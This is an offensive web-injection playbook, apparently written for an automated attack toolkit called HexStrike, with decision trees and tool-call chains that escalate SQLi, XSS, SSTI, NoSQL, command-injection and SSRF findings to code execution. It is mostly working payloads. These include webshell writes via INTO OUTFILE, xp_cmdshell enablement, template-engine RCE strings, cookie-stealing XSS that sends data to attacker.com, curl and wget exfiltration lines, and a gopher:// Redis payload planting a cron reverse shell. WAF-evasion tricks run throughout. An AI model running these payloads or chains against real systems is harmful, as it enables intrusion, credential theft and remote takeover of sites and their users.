# TTP: Web Injection Attacks

Comprehensive injection attack techniques mapped to HexStrike tools.
Covers SQL injection, XSS, SSTI, NoSQL injection, command injection,
and GraphQL injection with real payloads, decision trees, and attack chains.

**MITRE ATT&CK**: T1190 (Exploit Public-Facing Application), T1059 (Command Interpreter)

---

## Quick Decision Tree

```
detect_technologies_ai(target="target.com") → tech stack
wafw00f_scan(target="https://target.com")   → WAF presence

IF backend is PHP/MySQL     → SQLi (error-based, union, blind)
IF backend is Node.js       → NoSQLi, prototype pollution, SSTI
IF backend is Python/Flask  → SSTI (Jinja2), command injection
IF backend is Java          → SSTI (Freemarker), deserialization
IF backend is .NET          → ViewState deserialization, SQLi (MSSQL)
IF GraphQL endpoint found   → GraphQL injection, introspection
IF WAF detected             → Read hexstrike://ttp/waf-evasion first
```

---

## 1. SQL Injection

### 1a. Detection & Fingerprinting

```
# Step 1: Find injection points
arjun_parameter_discovery(url="https://target.com/api/search")
paramspider_mining(target="target.com")
gf_pattern_match(pattern="sqli", input=<url_list>)

# Step 2: Quick manual test via http_repeater
http_repeater(url="https://target.com/search",
              params={"q": "test' OR '1'='1"})
# Look for: SQL error messages, different response length, timing differences
```

**SQL error signatures by database:**

| Database | Error Pattern |
|----------|--------------|
| MySQL | `You have an error in your SQL syntax`, `mysql_fetch_array()` |
| PostgreSQL | `ERROR: syntax error at or near`, `pg_query()` |
| MSSQL | `Unclosed quotation mark`, `Microsoft OLE DB` |
| Oracle | `ORA-01756`, `quoted string not properly terminated` |
| SQLite | `SQLITE_ERROR`, `near "": syntax error` |

### 1b. Error-Based SQLi

**When to use**: Error messages visible in response.

```
sqlmap_scan(target="https://target.com/page?id=1",
            level=5, risk=3, technique="E")
```

**Manual payloads:**
```
# MySQL — EXTRACTVALUE (XML-based error extraction)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -

# MySQL — UPDATEXML variant
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -

# PostgreSQL — CAST error
' AND 1=CAST((SELECT version()) AS int)-- -

# MSSQL — CONVERT error
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
```

### 1c. Union-Based SQLi

**When to use**: Application reflects query results in response.

```
sqlmap_scan(target="https://target.com/page?id=1",
            level=5, risk=3, technique="U")
```

**Step-by-step manual approach:**
```
# Step 1: Find column count
' ORDER BY 1-- -     (OK)
' ORDER BY 2-- -     (OK)
' ORDER BY 3-- -     (OK)
' ORDER BY 4-- -     (ERROR → 3 columns)

# Step 2: Find displayable columns
' UNION SELECT 1,2,3-- -
# Look for: which number appears in the response

# Step 3: Extract data (assuming column 2 is displayed)
# MySQL
' UNION SELECT 1,version(),3-- -
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users-- -

# PostgreSQL
' UNION SELECT NULL,version(),NULL-- -
' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- -

# MSSQL
' UNION SELECT NULL,@@version,NULL-- -
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -

# SQLite (common in CTFs)
' UNION SELECT 1,sql,3 FROM sqlite_master-- -
' UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -
```

### 1d. Blind SQLi — Boolean-Based

**When to use**: No error output, but response differs for true/false.

```
sqlmap_scan(target="https://target.com/page?id=1",
            level=5, risk=3, technique="B",
            string="Welcome")  # string that appears when query is true
```

**Manual payloads:**
```
# MySQL boolean blind
' AND 1=1-- -                              (TRUE — normal response)
' AND 1=2-- -                              (FALSE — different response)
' AND SUBSTRING(database(),1,1)='a'-- -    (test first char of db name)
' AND SUBSTRING(database(),1,1)='t'-- -    (iterate through alphabet)

# Extract character by character:
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>96-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>112-- -
# Binary search narrows to exact character
```

### 1e. Blind SQLi — Time-Based

**When to use**: No visible difference in response (last resort).

```
sqlmap_scan(target="https://target.com/page?id=1",
            level=5, risk=3, technique="T",
            time_sec=5)
```

**Manual payloads:**
```
# MySQL time-based
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)-- -

# PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

# MSSQL time-based
'; WAITFOR DELAY '00:00:05'-- -
'; IF (1=1) WAITFOR DELAY '00:00:05'-- -

# SQLite time-based (uses heavy computation)
' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -
```

### 1f. Stacked Queries (RCE via SQLi)

**When to use**: Backend supports multiple statements (PHP+MySQL, MSSQL).

```
sqlmap_scan(target="https://target.com/page?id=1",
            level=5, risk=3, technique="S",
            os_shell=True)
```

**Manual payloads:**
```
# MSSQL — enable xp_cmdshell and execute
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -

# MySQL — write webshell (needs FILE privilege + writable web dir)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -

# PostgreSQL — command execution
'; CREATE TABLE cmd_exec(cmd_output text);-- -
'; COPY cmd_exec FROM PROGRAM 'id';-- -
'; SELECT * FROM cmd_exec;-- -
```

### 1g. SQLi Attack Chain: Injection → RCE

```
Step 1: sqlmap_scan(target=<url>, level=5, risk=3) → confirms injection
Step 2: sqlmap_scan(target=<url>, os_shell=True) → attempts OS shell
Step 3: IF Step 2 fails:
  → sqlmap_scan(target=<url>, file_write="/tmp/shell.php",
                file_dest="/var/www/html/shell.php")
Step 4: http_repeater(url="target.com/shell.php?cmd=id")
Step 5: IF all automated fails:
  → Use manual stacked query payloads above
  → Try writing to /tmp/ and accessing via LFI
```

---

## 2. Cross-Site Scripting (XSS)

### 2a. Detection

```
# Automated scanning
dalfox_xss_scan(target="https://target.com/search?q=test")
xsser_scan(target="https://target.com/search", parameter="q")

# Find reflective parameters
gf_pattern_match(pattern="xss", input=<url_list>)
```

### 2b. Reflected XSS

**When to use**: Input reflected in response without proper encoding.

```
# Basic detection
http_repeater(url="https://target.com/search",
              params={"q": "<script>alert(1)</script>"})

# If basic blocked, try:
http_repeater(url="https://target.com/search",
              params={"q": "<img src=x onerror=alert(1)>"})
```

**Payload progression (simple → advanced):**
```
# Level 1: Basic
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Level 2: Attribute escape
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
" onmouseover=alert(1) "

# Level 3: Filter bypass
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">

# Level 4: Encoding bypass
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
```

### 2c. Stored XSS

**When to use**: Input stored and displayed to other users.

```
# Test fields that store data: comments, profiles, messages
http_repeater(url="https://target.com/api/comments",
              method="POST",
              body={"comment": "<img src=x onerror=alert(document.cookie)>"},
              headers={"Content-Type": "application/json"})
```

### 2d. DOM-Based XSS

**When to use**: JavaScript processes URL fragments or parameters client-side.

```
# Common sinks:
# document.write(), innerHTML, eval(), setTimeout()
# Test via URL fragment:
https://target.com/page#<img src=x onerror=alert(1)>

# Test via URL parameters processed by JS:
https://target.com/page?callback=<script>alert(1)</script>
```

### 2e. XSS to Account Takeover

```
# Cookie theft payload:
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

# Session token extraction:
<script>fetch('https://attacker.com/steal?t='+localStorage.getItem('token'))</script>
```

---

## 3. Server-Side Template Injection (SSTI)

### 3a. Detection

```
tplmap_scan(target="https://target.com/render?name=test")

# Manual detection — inject math expressions:
http_repeater(url="https://target.com/render",
              params={"name": "{{7*7}}"})
# 49 in response = Jinja2 or Twig

http_repeater(url="https://target.com/render",
              params={"name": "${7*7}"})
# 49 in response = Freemarker or EL

http_repeater(url="https://target.com/render",
              params={"name": "<%= 7*7 %>"})
# 49 in response = ERB (Ruby)
```

### 3b. Exploitation by Engine

**Jinja2 (Python/Flask):**
```
# Read files:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# RCE:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

**Freemarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Pebble (Java):**
```
{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}
```

**ERB (Ruby):**
```
<%= system("id") %>
<%= `id` %>
```

---

## 4. NoSQL Injection

### 4a. Detection

```
nosqlmap_scan(target="https://target.com/api/login")

# Manual detection — MongoDB operators:
http_repeater(url="https://target.com/api/login",
              method="POST",
              body={"username": {"$gt": ""}, "password": {"$gt": ""}},
              headers={"Content-Type": "application/json"})
# If logged in → NoSQLi confirmed
```

### 4b. MongoDB Injection Payloads

```
# Authentication bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}

# Data extraction via $regex
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
# Iterate character by character

# Operator injection in URL params
?username[$ne]=&password[$ne]=
?username=admin&password[$gt]=
?username[$regex]=^admin&password[$gt]=
```

### 4c. MongoDB → RCE

```
# If $where operator is available:
{"$where": "function() { return true; }"}
{"$where": "this.password == 'test' || sleep(5000)"}

# Server-side JavaScript execution (older MongoDB):
{"$where": "function() { var x = new java.lang.ProcessBuilder; x.command(['id']); var y = x.start(); }"}
```

---

## 5. Command Injection

### 5a. Detection

```
commix_scan(target="https://target.com/api/ping?host=127.0.0.1")

# Manual detection:
http_repeater(url="https://target.com/api/ping",
              params={"host": "127.0.0.1; id"})
```

### 5b. Payloads by OS

**Linux:**
```
# Separators
; id
| id
|| id
& id
&& id
$(id)
`id`

# Newline injection
%0aid

# If spaces filtered:
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# If specific commands filtered:
/bin/c?t /etc/passwd
cat /etc/pas?wd
c''a''t /etc/passwd
c\at /etc/passwd
```

**Windows:**
```
& whoami
| whoami
&& whoami
; whoami (PowerShell)

# If spaces filtered:
type%PROGRAMFILES:~10,1%c:\windows\win.ini
```

### 5c. Blind Command Injection

```
# Time-based detection:
; sleep 5          (Linux)
& ping -n 5 127.0.0.1    (Windows)

# Out-of-band detection (DNS):
; nslookup attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(id|base64)
```

---

## 6. GraphQL Injection

### 6a. Introspection

```
graphql_introspection(target="https://target.com/graphql")

# Manual introspection query:
http_repeater(url="https://target.com/graphql",
              method="POST",
              body={"query": "{__schema{types{name,fields{name,type{name}}}}}"},
              headers={"Content-Type": "application/json"})
```

### 6b. Common GraphQL Attacks

```
# Unauthorized data access (query fields not meant for your role):
{"query": "{ users { id email password_hash role } }"}

# Batch query abuse (bypass rate limiting):
{"query": "[{ user(id:1){email} },{ user(id:2){email} },...]"}

# Nested query DoS:
{"query": "{ user(id:1) { posts { comments { author { posts { comments { ... } } } } } } }"}

# SQLi through GraphQL parameters:
{"query": "{ user(id: \"1' OR 1=1--\") { email } }"}
```

---

## 7. Modern Techniques (2025–2026)

### 7a. ORM Leak Attacks — SQLi's Successor

**PortSwigger Top 10 2025 #2.** As traditional SQLi declines due to parameterized
queries, ORM (Object-Relational Mapping) leaks are the new server-side data
extraction technique. Works against Django, Rails, Laravel, Hibernate — any ORM
that exposes filtering/search APIs.

```
# ORM leaks exploit filter/search parameters to extract data
# without ever writing raw SQL. The ORM itself is the vulnerability.

# Django ORM leak — field lookup operators
http_repeater(url="https://target.com/api/users",
              params={"email__startswith": "a"})
# If response differs → data extraction character by character
# email__startswith=a → 5 results
# email__startswith=b → 3 results
# email__contains, __endswith, __regex also work

# Rails/ActiveRecord — nested parameter injection
http_repeater(url="https://target.com/api/users",
              params={"filter[password_digest][starts_with]": "$2a$"})

# Laravel Eloquent — where clause injection
http_repeater(url="https://target.com/api/search",
              params={"where[role]": "admin"})

# Hibernate/JPA — JPQL injection via sort/filter params
http_repeater(url="https://target.com/api/items",
              params={"sort": "name,(CASE WHEN (1=1) THEN name ELSE id END)"})

# Generic detection: add ORM operators to any filter/search parameter
# __gt, __lt, __gte, __lte, __contains, __startswith, __endswith
# __regex, __in, __isnull, __exact
```

**Key insight**: ORM leaks bypass WAFs entirely because there's no SQL syntax —
just legitimate-looking filter parameters that the ORM translates to SQL internally.

### 7b. Error-Based Blind SSTI — Polyglot Detection (2025 #1)

**PortSwigger Top 10 2025 Winner.** New error-based techniques for exploiting
blind SSTI where output is never reflected. Uses error messages as a data
exfiltration channel — similar to error-based SQLi but for template engines.

```
# Polyglot SSTI detection payload — tests multiple engines simultaneously:
${{<%[%'"}}%\

# If ANY template engine is present, this triggers a distinct error
# that reveals which engine is running.

# Error-based extraction (Jinja2 blind):
# Force a TypeError that includes the data in the error message
{{1/0}}                        → ZeroDivisionError (confirms Jinja2)
{{config.__class__().__init__}} → Error reveals config object details

# Twig error-based:
{{1/0}}                → Division by zero error
{{"string"/0}}         → Type error reveals engine version

# Freemarker error-based:
${1/0}                 → ArithmeticException with engine details

# Modern polyglot detection chain:
# Step 1: Inject polyglot → identify engine from error
# Step 2: Use engine-specific error payloads → extract data
# Step 3: Chain with existing RCE payloads from Section 3

tplmap_scan(target="https://target.com/render?name=test")
→ Updated tplmap includes polyglot and error-based detection
```

### 7c. Unicode Normalization Attacks (2025 #4)

**WAF bypass via Unicode normalization.** When applications normalize Unicode
input (NFKC/NFKD), visually similar characters become their ASCII equivalents
AFTER the WAF inspects them.

```
# Unicode fullwidth characters (U+FF01 to U+FF5E) normalize to ASCII:
＜ → <     (U+FF1C → U+003C)
＞ → >     (U+FF1E → U+003E)
＇ → '     (U+FF07 → U+0027)
＂ → "     (U+FF02 → U+0022)
／ → /     (U+FF0F → U+002F)

# XSS via Unicode normalization:
＜script＞alert(1)＜/script＞
→ WAF sees: fullwidth chars (not < or >)
→ App normalizes to: <script>alert(1)</script>

# SQLi via Unicode normalization:
＇ OR 1＝1 --
→ WAF sees: fullwidth apostrophe (not ')
→ App normalizes to: ' OR 1=1 --

# Path traversal via Unicode:
..／..／..／etc／passwd
→ WAF sees: fullwidth slash
→ App normalizes to: ../../../etc/passwd

# HexStrike workflow:
http_repeater(url="https://target.com/search",
              params={"q": "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e"})
```

**Read `hexstrike://ttp/waf-evasion` for the full Unicode bypass table.**

### 7d. Parser Differentials (2025 #10)

When the WAF and the application parse the same request differently,
the WAF sees a safe request while the app processes the malicious one.

```
# Content-Type confusion:
# WAF parses as JSON, app parses as form-urlencoded (or vice versa)
http_repeater(url="https://target.com/api",
              method="POST",
              body='{"username": "admin\' OR 1=1--"}',
              headers={"Content-Type": "application/x-www-form-urlencoded"})
# WAF may not parse JSON inside form body

# Path normalization differential:
# WAF sees: /api/safe/../admin
# App resolves to: /admin
http_repeater(url="https://target.com/api/safe/../admin/users")

# Query string parsing differential:
# PHP: last value wins for duplicate params
# WAF: may only inspect first value
http_repeater(url="https://target.com/search?q=safe&q=' OR 1=1--")

# HTTP/2 pseudo-header injection:
# HTTP/2 allows headers that HTTP/1.1 doesn't
# Some reverse proxies translate H2→H1 incorrectly
# Inject via :path pseudo-header with embedded CRLF
```

### 7e. SSRF — Modern Techniques (2025 #3)

**Redirect loop technique** — making blind SSRF visible (PortSwigger #3 2025):

```
# Classic blind SSRF: you can make the server fetch a URL but
# can't see the response. The redirect loop technique forces
# the application to cycle through redirect status codes,
# leaking the response in error messages.

# PDF Generator SSRF (2025 hot vector):
# WeasyPrint, wkhtmltopdf, Puppeteer, Chrome headless
# Inject HTML that fetches internal URLs:
http_repeater(url="https://target.com/api/generate-pdf",
              method="POST",
              body={"html": "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/'></iframe>"})

# DNS Rebinding to bypass IMDSv2:
# Step 1: Set up a domain that alternates between your IP and 169.254.169.254
# Step 2: App resolves domain → your IP (passes validation)
# Step 3: Second resolution (actual fetch) → 169.254.169.254
# Tool: rbndr.us, singularity, custom DNS server

# gopher:// for Redis RCE (still works in 2025):
http_repeater(url="https://target.com/fetch",
              body={"url": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a\\n\\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\n\\n\\n%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"})

# Second-order SSRF:
# Malicious URL stored in profile/webhook/config
# Later processed by internal service (bypasses request-time validation)
```

### 7f. CVE Exploitation Workflow

```
# When you discover a service version, check for exploits:
# Step 1: detect_technologies_ai → identify versions
# Step 2: monitor_cve_feeds → check for recent CVEs
# Step 3: generate_exploit_from_cve(cve_id="CVE-2025-XXXXX")
#   → Searches Exploit-DB, GitHub PoCs, NVD
#   → Returns exploit code and adaptation guidance
# Step 4: correlate_threat_intelligence(target) → cross-reference
```

---

## Decision Logic Summary

```
1. detect_technologies_ai → identify backend + database
2. wafw00f_scan → check for WAF
3. arjun_parameter_discovery → find injection points
4. gf_pattern_match → classify parameter types

FOR EACH injectable parameter:
  IF database-backed:
    IF MySQL/PostgreSQL/MSSQL → sqlmap_scan with appropriate technique
    IF MongoDB/CouchDB → nosqlmap_scan
    IF ORM-filtered (Django/Rails/Laravel) → ORM leak via filter operators
  IF template-rendered:
    → tplmap_scan (polyglot detection for blind SSTI)
    → Error-based extraction if blind
  IF system-command-like:
    → commix_scan
  IF GraphQL endpoint:
    → graphql_introspection first, then targeted queries
  IF URL/redirect parameter:
    → SSRF testing (including gopher://, DNS rebinding)

IF WAF blocks payloads:
  → Read hexstrike://ttp/waf-evasion for bypass techniques
  → Try Unicode normalization bypass (fullwidth chars)
  → Try parser differentials (Content-Type confusion)
  → Add tamper scripts to sqlmap_scan
  → Use encoding-based XSS payloads
```
